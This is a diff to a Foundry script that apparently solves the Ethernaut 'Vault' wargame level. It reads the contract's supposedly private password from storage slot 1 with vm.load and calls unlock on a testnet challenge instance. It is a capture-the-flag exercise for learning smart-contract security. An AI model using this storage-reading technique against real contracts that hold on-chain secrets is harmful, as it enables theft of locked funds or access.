@@ -5,19 +5,24 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IVault {
+    function unlock(bytes32 _password) external;
+}
 
-contract ForceSolution is Script, EthernautHelper {
+contract VaultSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
 
+    // forge script script/solutions/08-Vault.s.sol:VaultSolution --rpc-url $SEPOLIA_RPC
     function run() public {
         vm.startBroadcast(heroPrivateKey);
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
-
+        IVault vault = IVault(challengeInstance);
+        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
+        vault.unlock(password);
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
